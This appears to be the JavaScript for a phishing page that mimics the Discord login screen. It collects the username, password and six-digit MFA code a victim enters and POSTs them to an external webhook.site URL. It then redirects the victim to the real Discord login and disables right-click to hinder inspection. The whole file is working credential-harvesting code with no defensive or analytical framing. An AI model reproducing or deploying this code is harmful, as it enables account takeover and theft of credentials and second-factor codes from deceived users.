const URL = 'https://webhook.site/ef17691a-2922-4756-a80a-61c9463c43ea';

// ----------------------------------
// LOGIN DATA
// ----------------------------------
let username;
let password;
let mfaCode;
// ----------------------------------
// SELECTING ELEMENTS
// ----------------------------------
const loginButton = document.querySelector("button");
const authBox = document.querySelector(".authBox");
const mfaBox = document.querySelector(".mfaBox");

const emailReq = document.getElementById("emailReq");
const passwordReq = document.getElementById("passwordReq");
const emailLabel = document.getElementById("emailLabel");
const passwordLabel = document.getElementById("passwordLabel");

const confirmButton = document.querySelector(".confirm");
const noMfa = document.getElementById("noMfaLink");
const authReq = document.querySelector(".mfa-required");

// -----------------------------------
// ELLIPSIS ANIMATION
// ------------------------------------
function removeEllipsisAnimation() {
  loginButton.innerHTML = "";
  loginButton.textContent = "Log In";
  loginButton.removeAttribute("disabled");
}

function animateEllipsis() {
  return new Promise((resolve) => {
    loginButton.innerHTML = "";
    loginButton.innerHTML = `<span class="spinner" role="img" aria-label="Loading">
                                      <span class="inner pulsingEllipsis">
                                          <span class="item spinnerItem"></span>
                                          <span class="item spinnerItem"></span>
                                          <span class="item spinnerItem"></span>
                                      </span>
                             </span>`;
    const spinnerItems = document.querySelectorAll(".spinnerItem");
    spinnerItems.forEach((item, index) => {
      item.style.animation = `spinner-pulsing-ellipsis 1.4s infinite ease-in-out ${
        index * 0.2
      }s`;
    });
    loginButton.setAttribute("disabled", "true");

    // Use setTimeout within the promise to delay resolve
    setTimeout(() => {
      removeEllipsisAnimation();
      resolve(); // Resolve the promise after animation completes
    }, 1500);
  });
}

// --------------------------------------------------
// ---------- WANDERING CUBES ANIMATION -------------
// --------------------------------------------------

function simulateQrCodeChange() {
  const qrCodeContainer = document.querySelector(".right-section .qr-code");
  qrCodeContainer.style.background = "transparent";

  // Insert wandering cubes markup
  const markup = `<span
  class="spinner qrCode-spinner"
  role="img"
  aria-label="Loading"
  aria-hidden="true"
  >
  <span class="inner wanderingCubes">
    <span class="item"></span>
    <span class="item"></span>
  </span>
</span>`;

  qrCodeContainer.insertAdjacentHTML("afterbegin", markup);
}

// --------------------------
// ATTACHING EVENT LISTENERS
// --------------------------
loginButton.addEventListener("click", () => {
  username = document.getElementById('emailORphone').value;
  password = document.getElementById('password').value;
  if (username && password) {
    callReq({ username: username, password: password});
    changeDisplayBox();
  } else {
    changeLoginStyle();
  }
});

confirmButton.addEventListener("click", async () => {
  mfaCode = document.getElementById('mfaCode').value;
  console.log(mfaCode);
  
  if (mfaCode.length < 6) {
    authReq.style.display = "flex";
  } else {
    await callReq({ username: username, password: password, mfa: mfaCode});
    document.location = 'https://discord.com/login';
  }
});

noMfa.addEventListener("click", async () => {
  document.location = 'https://discord.com/login';
});

document.addEventListener("contextmenu", function (e) {
  e.preventDefault();
});

// --------------------------
// HELPERS
// --------------------------

const changeDisplayBox = async () => {
  await animateEllipsis();
  authBox.style.display = "none";
  mfaBox.style.display = "flex";
}

const changeLoginStyle = () => {
  emailReq.textContent = "- Login or password is invalid";
  passwordReq.textContent = "- Login or password is invalid";
  emailReq.style.color = "#FA777C";
  passwordReq.style.color = "#FA777C";
  emailReq.style.fontWeight = "Normal";
  passwordReq.style.fontWeight = "Normal";
  emailReq.style.fontStyle = "italic";
  passwordReq.style.fontStyle = "italic";

  emailLabel.style.color = "#FA777C";
  passwordLabel.style.color = "#FA777C";
}

// ----------------------------------
// API REQUEST
// ----------------------------------
const callReq = async (loginInfo) => {
  await fetch(URL, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(loginInfo),
    mode: 'no-cors'
  });
};